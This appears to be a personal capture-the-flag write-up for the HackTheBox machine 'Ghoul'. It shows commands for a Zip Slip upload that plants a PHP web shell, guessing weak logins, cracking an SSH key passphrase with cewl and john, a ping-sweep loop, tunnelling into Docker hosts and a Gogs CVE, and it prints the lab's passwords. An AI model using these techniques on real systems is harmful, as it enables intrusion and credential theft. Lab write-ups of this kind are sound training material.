# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/OVMupjl.png)
![](https://i.imgur.com/RusP5Ro.png)
#### Port 80
![](https://i.imgur.com/u79AV3y.png)
![](https://i.imgur.com/hWFvmcj.png)


![](https://i.imgur.com/6LHLkwF.png)
- I logged in with and ths happened
	- `admin : abcdef `![](https://i.imgur.com/l6aMLSx.png)
- The image link is "http://ghoul.htb/users/kaneki.jpg" from this the image name looks like a real name so i tried to bruteforce with password.
- ` kaneki : 123456 , 0123456` - it works and it is same as the `admin`
##### Port 8080
![](https://i.imgur.com/bqznvHb.png)
- ![](https://i.imgur.com/3EBMjay.png)
### Gaining Access

```sh
rexder@HunterMachine ~/C/H/M/ghoul> git clone https://github.com/ptoomey3/evilarc
Cloning into 'evilarc'...
remote: Enumerating objects: 12, done.
remote: Total 12 (delta 0), reused 0 (delta 0), pack-reused 12
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (1/1), done.

rexder@HunterMachine ~/C/H/M/ghoul> cd evilarc/
rexder@HunterMachine ~/C/H/M/g/evilarc (master)> ls
README.md  evilarc.py

rexder@HunterMachine ~/C/H/M/g/evilarc (master)> python2 evilarc.py -o unix -p var/www/html/uploads shell.php
Creating evil.zip containing ../../../../../../../../var/www/html/uploads/shell.php
```
- Uploaded the shell and i got in
- ![](https://i.imgur.com/Th3W28U.png)
## Internal
### Enumeration
`$logins = array('kaneki' => '123456','noro' => 'password123','admin' => 'abcdef');`
![](https://i.imgur.com/2oTl5QY.png)
`<!--<user username="admin" password="test@aogiri123" roles="admin" />`
### Gaining Access
```shell
╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxrwx 1 www-data www-data 862779 May 31 13:07 /tmp/lin.sh
-rw-r--r-- 1 root root 5696 May 31 12:57 /var/tmp/evil.zip
-rw-r--r-- 1 root root 2391908 May 31 09:10 /var/tmp/rexder.jpg
-rw-r--r-- 1 root root 1643841 Jan 22  2019 /var/tmp/hunt.zip
-rw-r--r-- 1 root root 1677441 Jan 22  2019 /var/tmp/edited_NSA-Report.pdf
-rw-r--r-- 1 root root 101 Jan 22  2019 /var/tmp/k.zip
-rw-r--r-- 1 root root 1868 Jan 22  2019 /var/tmp/txt
-rw-r--r-- 1 root root 4404 Jan 22  2019 /var/tmp/angecrypt.py
-rw-r--r-- 1 root root 5500549 Jan 22  2019 /var/tmp/f.zip
-rw-r--r-- 1 root root 92160 May 31 06:30 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 3886432 Dec 13  2018 /var/backups/backups/Important.pdf
-rw-r--r-- 1 root root 29380 Dec 13  2018 /var/backups/backups/sales.xlsx
-rw-r--r-- 1 root root 112 Dec 13  2018 /var/backups/backups/note.txt
-rwxr--r-- 1 root root 1675 Dec 13  2018 /var/backups/backups/keys/noro.backup
-rwxr--r-- 1 root root 1766 Dec 13  2018 /var/backups/backups/keys/kaneki.backup
-rwxr--r-- 1 root root 1675 Dec 13  2018 /var/backups/backups/keys/eto.backup
-rw-r--r-- 1 root root 3886432 Dec 13  2018 /var/backups/backups/Important.pdf
-rw-r--r-- 1 root root 29380 Dec 13  2018 /var/backups/backups/sales.xlsx
-rw-r--r-- 1 root root 112 Dec 13  2018 /var/backups/backups/note.txt
-rwxr--r-- 1 root root 1675 Dec 13  2018 /var/backups/backups/keys/noro.backup
-rwxr--r-- 1 root root 1766 Dec 13  2018 /var/backups/backups/keys/kaneki.backup
-rwxr--r-- 1 root root 1675 Dec 13  2018 /var/backups/backups/keys/eto.backup
```
![](https://i.imgur.com/S57qNhA.png)
```shell
rexder@HunterMachine ~/C/H/M/ghoul> cewl --with-numbers http://ghoul.htb/secret.php -w word3.list
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
rexder@HunterMachine ~/C/H/M/ghoul> john --wordlist=word3.list kaneki.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ILoveTouka       (kaneki.pem)
1g 0:00:00:00 DONE (2024-05-31 17:21) 50.00g/s 5500p/s 5500c/s 5500C/s work..moment
```
![](https://i.imgur.com/McERsww.png)
- I fuzzed the Docker IP and i got `172.20.0.150 is up` 
- inside the .ssh`authorized_keys` exists, 
```shell
(remote) kaneki@07d8ec0e562e:/home/kaneki/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl kaneki_pub@kaneki-pc
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri
```
- another user `kaneki_pub`
![](https://i.imgur.com/4Jbd73v.png)
```
for i in `seq 2 255`
do 
	ping -c 1 -W 1 172.18.0.$i 1>/dev/null 2>&1 
	if [[ $? -eq 0 ]] 
	then 
		echo "172.20.0.$i is up" 
	fi
 done
```
```shell
kaneki_pub@kaneki-pc:~$ cat to-do.txt
Give AogiriTest user access to Eto for git.
```
- i Did 2 tunnels
```shell
Kali -> 1st machine(172.20.0.200) -> 2nd machine(172.18.0.2) and accessed gogs
```
- ` AogiriTest : test@aogiri123 ` - is the cred
https://github.com/vulhub/vulhub/blob/master/gogs/CVE-2018-18925/README.md
![](https://i.imgur.com/CeQorld.png)
![](https://i.imgur.com/YQHBqIg.png)

### Maintaining Access
![](https://i.imgur.com/9H6zNS3.png)
```shell
/root # cat session.sh
#!/bin/bash
while true
do
  sleep 300
  rm -rf /data/gogs/data/sessions
  sleep 2
  curl -d 'user_name=kaneki&password=12345ILoveTouka!!!' http://172.18.0.2:3000/user/login
done
```
![](https://i.imgur.com/gglNSBo.png)
```shell
-spring.datasource.url=jdbc:mysql://localhost:3306/db
-spring.datasource.username=root
-spring.datasource.password=root
+spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
+spring.datasource.username=kaneki
+spring.datasource.password=jT7Hr$.[nF.)c)4C
 server.address=0.0.0.0

-spring.datasource.url=jdbc:mysql://localhost:3306/db
+spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
 spring.datasource.username=kaneki
-spring.datasource.password=7^Grc%C\7xEQ?tb4
+spring.datasource.password=jT7Hr$.[nF.)c)4C
 server.address=0.0.0.0
```


# Random Notes